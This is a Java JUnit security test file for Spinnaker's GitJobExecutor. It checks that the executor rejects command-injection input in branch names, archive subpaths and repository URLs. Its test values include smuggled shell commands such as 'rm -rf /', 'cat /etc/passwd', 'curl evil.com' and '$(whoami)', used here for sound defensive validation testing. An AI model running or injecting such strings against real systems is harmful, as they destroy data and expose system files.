/*
 * Copyright 2026 McIntosh.farm
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.netflix.spinnaker.clouddriver.artifacts.gitRepo;

import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

import com.netflix.spinnaker.clouddriver.jobs.JobExecutor;
import com.netflix.spinnaker.clouddriver.jobs.JobResult;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.api.io.TempDir;
import org.junitpioneer.jupiter.TempDirectory;

/**
 * Security tests for GitJobExecutor to ensure proper input validation and prevention of command
 * injection attacks.
 */
@ExtendWith({TempDirectory.class})
class GitJobExecutorSecurityTest {

  private GitJobExecutor gitJobExecutor;

  @TempDir Path tempDir;

  @BeforeEach
  void setUp() throws IOException {
    JobExecutor mockJobExecutor;
    mockJobExecutor = mock(JobExecutor.class);

    // Mock successful job execution
    when(mockJobExecutor.runJob(any()))
        .thenReturn(
            JobResult.<String>builder().result(JobResult.Result.SUCCESS).output("success").build());

    GitRepoArtifactAccount account = GitRepoArtifactAccount.builder().name("test-account").build();

    gitJobExecutor = new GitJobExecutor(account, mockJobExecutor, "git");
  }

  // Tests for valid git references
  @Test
  @DisplayName("Should accept valid branch names")
  void shouldAcceptValidBranchNames() throws IOException {
    Path localPath = tempDir.resolve("clone");
    Files.createDirectories(localPath);

    assertDoesNotThrow(
        () -> gitJobExecutor.cloneOrPull("http://example.com/repo.git", "main", localPath, "repo"));
    assertDoesNotThrow(
        () ->
            gitJobExecutor.cloneOrPull(
                "http://api.github.com/example/repo.git", "main", localPath, "repo"));
    assertDoesNotThrow(
        () ->
            gitJobExecutor.cloneOrPull(
                "http://example.com/repo.git", "feature/new-feature", localPath, "repo"));
    assertDoesNotThrow(
        () ->
            gitJobExecutor.cloneOrPull(
                "http://example.com/repo.git", "release-1.0", localPath, "repo"));
    assertDoesNotThrow(
        () ->
            gitJobExecutor.cloneOrPull("http://example.com/repo.git", "v1.2.3", localPath, "repo"));
  }

  // Tests for valid git references
  @Test
  @DisplayName("Verify a set of common URL patterns are valid.")
  void checkSomeCommonUrlPatterns() throws IOException {
    Path localPath = tempDir.resolve("clone");
    Files.createDirectories(localPath);
    String[] validUrls = {
      "https://github.com/repo.git",
      "https://gitlab.com/repo.git",
      "https://bitbucket.org/repo.git",
      "https://internal.company.com/repo.git",
      "https://localhost:3000/project/repo" // gitea where a .git extension is NOT needed
    };

    for (String url : validUrls) {
      assertDoesNotThrow(() -> gitJobExecutor.cloneOrPull(url, "main", localPath, "repo"));
    }
  }

  @Test
  @DisplayName("Should accept valid full SHA commit hashes")
  void shouldAcceptValidFullSha() throws IOException {
    Path localPath = tempDir.resolve("clone");
    Files.createDirectories(localPath);

    String validFullSha = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0";
    assertDoesNotThrow(
        () ->
            gitJobExecutor.cloneOrPull(
                "http://example.com/repo.git", validFullSha, localPath, "repo"));
  }

  @Test
  @DisplayName("Should accept valid short SHA commit hashes")
  void shouldAcceptValidShortSha() throws IOException {
    Path localPath = tempDir.resolve("clone");
    Files.createDirectories(localPath);

    String validShortSha = "a1b2c3d";
    assertDoesNotThrow(
        () ->
            gitJobExecutor.cloneOrPull(
                "http://example.com/repo.git", validShortSha, localPath, "repo"));
  }

  @Test
  @DisplayName("Should accept valid subdirectory paths")
  void shouldAcceptValidSubdirectoryPaths() throws IOException {
    Path localClone = tempDir.resolve("repo");
    Path outputFile = tempDir.resolve("output.tgz");
    Files.createDirectories(localClone.resolve(".git"));

    assertDoesNotThrow(
        () -> gitJobExecutor.archive(localClone, "main", "src/main/java", outputFile));
    assertDoesNotThrow(() -> gitJobExecutor.archive(localClone, "main", "docs/api", outputFile));
    assertDoesNotThrow(() -> gitJobExecutor.archive(localClone, "main", "config.yml", outputFile));
  }

  // Tests for command injection attempts
  @Test
  @DisplayName("Should reject branch names with semicolons (command injection)")
  void shouldRejectBranchNamesWithSemicolons() {
    Path localPath = tempDir.resolve("clone");

    IllegalArgumentException exception =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                gitJobExecutor.cloneOrPull(
                    "http://example.com/repo.git", "main; rm -rf /", localPath, "repo"));

    assertContainsInvalidCharactersMessage(exception);
  }

  @Test
  @DisplayName("Should reject branch names with pipes (command injection)")
  void shouldRejectBranchNamesWithPipes() {
    Path localPath = tempDir.resolve("clone");

    IllegalArgumentException exception =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                gitJobExecutor.cloneOrPull(
                    "http://example.com/repo.git", "main | cat /etc/passwd", localPath, "repo"));

    assertContainsInvalidCharactersMessage(exception);
  }

  @Test
  @DisplayName("Should reject branch names with backticks (command injection)")
  void shouldRejectBranchNamesWithBackticks() {
    Path localPath = tempDir.resolve("clone");

    IllegalArgumentException exception =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                gitJobExecutor.cloneOrPull(
                    "http://example.com/repo.git", "main`whoami`", localPath, "repo"));

    assertContainsInvalidCharactersMessage(exception);
  }

  @Test
  @DisplayName("Should reject branch names with dollar signs (command injection)")
  void shouldRejectBranchNamesWithDollarSigns() {
    Path localPath = tempDir.resolve("clone");

    IllegalArgumentException exception =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                gitJobExecutor.cloneOrPull(
                    "http://example.com/repo.git", "main$(whoami)", localPath, "repo"));

    assertContainsInvalidCharactersMessage(exception);
  }

  @Test
  @DisplayName("Should reject branch names with ampersands (command injection)")
  void shouldRejectBranchNamesWithAmpersands() {
    Path localPath = tempDir.resolve("clone");

    IllegalArgumentException exception =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                gitJobExecutor.cloneOrPull(
                    "http://example.com/repo.git", "main && curl evil.com", localPath, "repo"));

    assertContainsInvalidCharactersMessage(exception);
  }

  @Test
  @DisplayName("Should reject branch names with newlines (command injection)")
  void shouldRejectBranchNamesWithNewlines() {
    Path localPath = tempDir.resolve("clone");

    IllegalArgumentException exception =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                gitJobExecutor.cloneOrPull(
                    "http://example.com/repo.git", "main\nwhoami", localPath, "repo"));

    assertContainsInvalidCharactersMessage(exception);
  }

  @Test
  @DisplayName("Should reject branch names with spaces (potential injection)")
  void shouldRejectBranchNamesWithSpaces() {
    Path localPath = tempDir.resolve("clone");

    IllegalArgumentException exception =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                gitJobExecutor.cloneOrPull(
                    "http://example.com/repo.git", "main branch", localPath, "repo"));

    assertContainsInvalidCharactersMessage(exception);
  }

  @Test
  @DisplayName("Should reject branch names with redirection operators")
  void shouldRejectBranchNamesWithRedirection() {
    Path localPath = tempDir.resolve("clone");

    IllegalArgumentException exception1 =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                gitJobExecutor.cloneOrPull(
                    "http://example.com/repo.git", "main > /tmp/pwned", localPath, "repo"));

    assertContainsInvalidCharactersMessage(exception1);

    IllegalArgumentException exception2 =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                gitJobExecutor.cloneOrPull(
                    "http://example.com/repo.git", "main < /etc/passwd", localPath, "repo"));

    assertContainsInvalidCharactersMessage(exception2);
  }

  @Test
  @DisplayName("Should reject subdirectory paths with command injection")
  void shouldRejectSubdirectoryPathsWithInjection() throws IOException {
    Path localClone = tempDir.resolve("repo");
    Path outputFile = tempDir.resolve("output.tgz");
    Files.createDirectories(localClone.resolve(".git"));

    IllegalArgumentException exception1 =
        assertThrows(
            IllegalArgumentException.class,
            () -> gitJobExecutor.archive(localClone, "main", "src; rm -rf /", outputFile));

    assertContainsInvalidCharactersMessage(exception1);

    IllegalArgumentException exception2 =
        assertThrows(
            IllegalArgumentException.class,
            () -> gitJobExecutor.archive(localClone, "main", "src | whoami", outputFile));

    assertContainsInvalidCharactersMessage(exception2);

    IllegalArgumentException exception3 =
        assertThrows(
            IllegalArgumentException.class,
            () -> gitJobExecutor.archive(localClone, "main", "src`id`", outputFile));

    assertContainsInvalidCharactersMessage(exception3);
  }

  @Test
  @DisplayName("Should reject null or empty branch names")
  void shouldRejectNullOrEmptyBranchNames() {
    Path localPath = tempDir.resolve("clone");

    assertThrows(
        IllegalArgumentException.class,
        () -> gitJobExecutor.cloneOrPull("http://example.com/repo.git", null, localPath, "repo"));

    assertThrows(
        IllegalArgumentException.class,
        () -> gitJobExecutor.cloneOrPull("http://example.com/repo.git", "", localPath, "repo"));
  }

  @Test
  @DisplayName("Should reject when someone tries to use a repo URL to inject bad creds")
  void blowUPWhenBadRepoUrlIsIn() {
    Path localPath = tempDir.resolve("clone");
    assertThrows(
        IllegalArgumentException.class,
        () ->
            gitJobExecutor.cloneOrPull(
                "http://example.com/repo.git; cat /etc/passwd > /tmp/bad-actor.txt",
                "main",
                localPath,
                "repo"));
    assertThrows(
        IllegalArgumentException.class,
        () ->
            gitJobExecutor.cloneOrPull(
                "http://example.com/repo.git$(echo 'bad' > /tmp/bad-actor.txt)",
                "main",
                localPath,
                "repo"));
    assertThrows(
        IllegalArgumentException.class,
        () ->
            gitJobExecutor.cloneOrPull(
                "http://$(cat /etc/passwd):username@example.com/repo.git",
                "main",
                localPath,
                "repo"));
    assertThrows(
        IllegalArgumentException.class,
        () ->
            gitJobExecutor.cloneOrPull(
                "http://username:`cat /etc/passwd`@example.com/repo.git",
                "main",
                localPath,
                "repo"));
  }

  @Test
  @DisplayName("Should reject branch names with other special characters")
  void shouldRejectBranchNamesWithSpecialCharacters() {
    Path localPath = tempDir.resolve("clone");

    String[] invalidBranches = {
      "main@{evil}",
      "main*",
      "main?query",
      "main#anchor",
      "main!important",
      "main%evil",
      "main(evil)",
      "main[evil]",
      "main{evil}",
      "main'evil",
      "main\"evil",
      "main\\evil"
    };

    for (String branch : invalidBranches) {
      assertThrows(
          IllegalArgumentException.class,
          () ->
              gitJobExecutor.cloneOrPull("http://example.com/repo.git", branch, localPath, "repo"),
          "Should reject branch: " + branch);
    }
  }

  @Test
  @DisplayName("Should validate branch in archive method")
  void shouldValidateBranchInArchiveMethod() throws IOException {
    Path localClone = tempDir.resolve("repo");
    Path outputFile = tempDir.resolve("output.tgz");
    Files.createDirectories(localClone.resolve(".git"));

    IllegalArgumentException exception =
        assertThrows(
            IllegalArgumentException.class,
            () -> gitJobExecutor.archive(localClone, "main; rm -rf /", "src", outputFile));

    assertContainsInvalidCharactersMessage(exception);
  }

  @Test
  @DisplayName("Should accept empty subdirectory path")
  void shouldAcceptEmptySubdirectoryPath() throws IOException {
    Path localClone = tempDir.resolve("repo");
    Path outputFile = tempDir.resolve("output.tgz");
    Files.createDirectories(localClone.resolve(".git"));

    assertDoesNotThrow(() -> gitJobExecutor.archive(localClone, "main", "", outputFile));
    assertDoesNotThrow(() -> gitJobExecutor.archive(localClone, "main", null, outputFile));
  }

  private void assertContainsInvalidCharactersMessage(IllegalArgumentException exception) {
    assertThat(exception.getMessage())
        .withFailMessage("Exception should let the user know there was a problem")
        .containsAnyOf("contains invalid characters", "cannot be null or empty");
  }
}
